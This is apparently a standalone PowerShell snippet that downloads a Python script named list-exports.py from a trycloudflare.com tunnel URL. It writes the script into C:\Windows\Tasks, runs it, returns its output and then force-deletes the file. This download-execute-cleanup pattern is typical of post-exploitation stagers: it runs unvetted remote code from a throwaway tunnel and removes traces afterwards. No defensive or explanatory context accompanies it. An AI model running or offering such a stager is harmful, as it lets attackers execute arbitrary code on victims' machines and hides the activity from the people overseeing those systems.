$pyBytes = (Invoke-WebRequest -Uri "https://taxes-surprised-immediately-transportation.trycloudflare.com/scripts/list-exports.py" -UseBasicParsing).Content
[System.IO.File]::WriteAllBytes("C:\Windows\Tasks\exports.py", $pyBytes)
$result = & "C:\Program Files\Python310\python.exe" "C:\Windows\Tasks\exports.py" 2>&1
$result -join "`n"
Remove-Item "C:\Windows\Tasks\exports.py" -Force -ErrorAction SilentlyContinue
